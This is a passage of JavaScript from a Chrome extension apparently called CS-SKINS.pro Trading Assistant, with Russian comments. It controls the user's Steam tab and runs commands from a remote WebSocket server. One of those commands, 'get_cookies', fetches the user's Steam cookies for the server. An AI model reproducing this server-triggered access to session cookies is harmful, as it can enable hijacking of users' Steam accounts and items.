        await updateActivityIcon();
    }
}

/**
 * Централизованный класс для всех запросов к Steam API
 * Выполняет запросы через chrome.scripting.executeScript
 */
class SteamAPI {
    /**
     * Выполняет запрос к Steam API
     * @param {Object} config - Конфигурация запроса
     * @param {string} config.url - URL для запроса
     * @param {string} config.method - HTTP метод
     * @param {Object} config.data - Данные для отправки
     * @param {string} config.preRequestUrl - URL для предварительного перехода (опционально)
     * @param {Function} config.successValidator - Функция проверки успешного ответа
     * @param {string} config.operation - Название операции для логирования
     * @returns {Promise} - Промис с результатом
     */
    static async request(config) {
        console.log(`[SteamAPI] Starting ${config.operation} request`, config);
        
        try {
            // Находим вкладку Steam
            const tabs = await chrome.tabs.query({ url: "https://steamcommunity.com/*" });
            console.log(`[SteamAPI] Found ${tabs.length} Steam tabs`);
            
            if (!tabs.length) {
                throw new Error("Нет открытых вкладок Steam");
            }
            
            const tab = tabs[0];
            
            if (config.preRequestUrl) {
                console.log(`[SteamAPI] Navigating to: ${config.preRequestUrl}`);
                await chrome.tabs.update(tab.id, { url: config.preRequestUrl, active: true });
                
                // Ждем загрузки страницы
                await new Promise((resolve) => {
                    chrome.tabs.onUpdated.addListener(function listener(tabId, changeInfo) {
                        if (tabId === tab.id && changeInfo.status === 'complete') {
                            chrome.tabs.onUpdated.removeListener(listener);
                            resolve();
                        }
                    });
                });
                
                // Дополнительная задержка для инициализации JS
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            
            // Отправляем запрос в steam-injector.js через sendMessage
            const response = await chrome.tabs.sendMessage(tab.id, {
                type: 'STEAM_API_REQUEST',
                config: config
            });
            
            console.log(`[SteamAPI] Response from steam-injector:`, response);
            
            if (!response) {
                console.log(`[SteamAPI] No response from steam-injector for ${config.operation}`);
                return {
                    success: false,
                    error: 'No response from steam-injector',
                    operation: config.operation
                };
            }
            
            // Просто возвращаем ответ как есть, без throw
            return response;
            
        } catch (error) {
            console.log(`[SteamAPI] Exception in ${config.operation}:`, error.message);
            
            // Возвращаем ошибку как результат, не throw
            return {
                success: false,
                error: error.message,
                operation: config.operation,
                httpStatus: error.httpStatus,
                rawResponse: error.rawResponse
            };
        }
    }
    
    /**
     * Отправляет информацию об ошибке на сервер
     */
    static async logError(errorData) {
        console.error('[SteamAPI] Logging error to server:', errorData);
        
        try {
            await sendToServer('steam_api_error', {
                ...errorData,
                extension_version: chrome.runtime.getManifest().version
            });
        } catch (error) {
            console.error('[SteamAPI] Failed to log error to server:', error);
        }
    }
}

// Создаем экземпляр Trading Assistant
const tradingAssistant = new TradingAssistant();

/**
 * Универсальный глобальный метод для отправки сообщений на сервер через WebSocket
 */
async function sendToServer(type, data = {}) {
    if (!tradingAssistant.wsConnection || tradingAssistant.wsConnection.readyState !== WebSocket.OPEN) {
        console.warn('WebSocket not connected, cannot send message:', { type, data });
        return false;
    }
    
    try {
        const storageData = await tradingAssistant.storage.getData();
        const channel = storageData.websocketChannel;
        
        if (!channel) {
            console.warn('No WebSocket channel available');
            return false;
        }
        
        tradingAssistant.wsConnection.send(JSON.stringify({
            event: 'client-message',
            data: { type, ...data },
            channel: channel
        }));
        
        return true;
    } catch (error) {
        console.error('Error sending message to server:', error);
        return false;
    }
}

/**
 * Глобальный обработчик входящих сообщений от сервера
 */
async function handleServerMessage(messageType, messageData) {
    try {
        switch (messageType) {
            // Системные сообщения Pusher - игнорируем без вывода в консоль
            case 'pusher:connection_established':
            case 'pusher_internal:subscription_succeeded':
            case 'pusher:error':
            case 'pusher:ping':
            case 'pusher:pong':
                // Не логируем системные события Pusher
                return;
                
            default:
                // Выводим только реальные сообщения от сервера в консоль для отладки
                console.log('[handleServerMessage] Called with:', { messageType, timestamp: new Date().toISOString() });
                console.log('Server message received:', { messageType, messageData });
        }
        
        // Обработка реальных сообщений
        switch (messageType) {
            case 'trade_offer_created':
                // Новое предложение для обработки
                await tradingAssistant.processTradeOffer({ trade_offer: messageData.trade_offer });
                break;
                
            case 'notification':
                // Системные уведомления
                if (messageData.message) {
                    await tradingAssistant.showNotification('Уведомление', messageData.message);
                }
                break;
                
            case 'force_logout':
                // Принудительный выход
                const message = messageData.message || 'Токен изменен. Требуется переавторизация.';
                await tradingAssistant.logout();
                
                chrome.runtime.sendMessage({
                    type: 'FORCE_LOGOUT',
                    message: message
                }).catch(() => {});
                
                await tradingAssistant.showNotification('Требуется переавторизация', message);
                break;
                
            case 'cancel_steam_trade':
                // Команда на отмену Steam трейда
                await tradingAssistant.cancelSteamTrade(messageData);
                break;
                
            case 'ping':
                // Проверка доступности расширения и Steam
                console.log('[PING] Received ping from server, checking Steam status...');
                
                const steamStatus = await tradingAssistant.checkSteamStatusDirect();
                console.log('[PING] Steam status:', steamStatus);
                
                await sendToServer('pong', {
                    timestamp: messageData.timestamp,
                    steam_available: steamStatus.available,
                    steam_state: steamStatus.state,
                    steam_reason: steamStatus.reason
                });
                break;
                
            case 'check_trade_status':
                // Команда на проверку статуса трейд-офферов
                await tradingAssistant.checkTradeOfferStatus(messageData);
                break;
                
            case 'get_cookies':
                // Команда на получение Steam куков
                await tradingAssistant.getCookiesForServer(messageData);
                break;
        }
        
        // Универсальная обработка статистики для всех событий
        if (messageData && messageData.stats) {
            await tradingAssistant.storage.setData({ lastStats: messageData.stats });
            
            chrome.runtime.sendMessage({
                type: 'STATS_RECEIVED',
                stats: messageData.stats
            }).catch(() => {});
        }
        
        // Универсальная обработка log_message для всех событий
        if (messageData && messageData.log_message) {
            await tradingAssistant.storage.addLogEntry('info', messageData.log_message);
        }
    } catch (error) {
        console.error('Ошибка обработки сообщения от сервера:', error);
    }
}

// Делаем доступными глобально
globalThis.sendToServer = sendToServer;
globalThis.handleServerMessage = handleServerMessage;

// Глобальные переменные
let detachedWindows = new Set();
let keepAliveTimer = null;

// Keep-alive система
function startKeepAlive() {
    if (keepAliveTimer) return;
    
    chrome.alarms.create('keepAlive', { periodInMinutes: 1 });
    chrome.alarms.create('badgeTicker', { periodInMinutes: 0.1 });
    updateActivityIcon();
}

function stopKeepAlive() {
    chrome.alarms.clear('keepAlive');
    chrome.alarms.clear('badgeTicker');
    chrome.action.setBadgeText({ text: '' });
    keepAliveTimer = null;
}

chrome.alarms.onAlarm.addListener((alarm) => {
    if (['keepAlive', 'badgeTicker'].includes(alarm.name)) {
        updateActivityIcon();
    }
});

async function updateActivityIcon() {
    try {
        const { isActive, isAuthorized } = tradingAssistant;
        
        const title = isActive && isAuthorized
            ? 'CS-SKINS.pro - Активен'
            : isAuthorized
            ? 'CS-SKINS.pro - Подключен'
            : 'CS-SKINS.pro - Не подключен';
            
        await chrome.action.setTitle({ title });
        
        const badgeConfig = getBadgeConfig(isActive, isAuthorized);
        chrome.action.setBadgeText({ text: badgeConfig.text });
        chrome.action.setBadgeBackgroundColor({ color: badgeConfig.color });
        
    } catch (error) {
        chrome.action.setBadgeText({ text: '' });
    }
}

function getBadgeConfig(isActive, isAuthorized) {
    if (isActive && isAuthorized) {
        return { text: '●', color: '#44ff44' };
    } else if (isAuthorized) {
        return { text: '○', color: '#ff8d2f' };
    } else if (detachedWindows.size > 0) {
        return { text: '○', color: '#888888' };
    } else {
        return { text: '×', color: '#888888' };
    }
}

// Обработчики событий
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    tradingAssistant.handleMessage(message, sender, sendResponse);
    return true;
});

chrome.windows.onRemoved.addListener(async (windowId) => {
    if (detachedWindows.has(windowId)) {
        detachedWindows.delete(windowId);
        
        if (!tradingAssistant.isActive && detachedWindows.size === 0) {
            stopKeepAlive();
        }
        
        chrome.action.setBadgeText({ text: '' });
    }
});

chrome.runtime.onInstalled.addListener(async (details) => {
    if (details.reason === 'install') {
        await tradingAssistant.showNotification(
            'Добро пожаловать!',
            'CS-SKINS.pro Trading Assistant установлен. Настройте его в popup.'
        );
    }
});

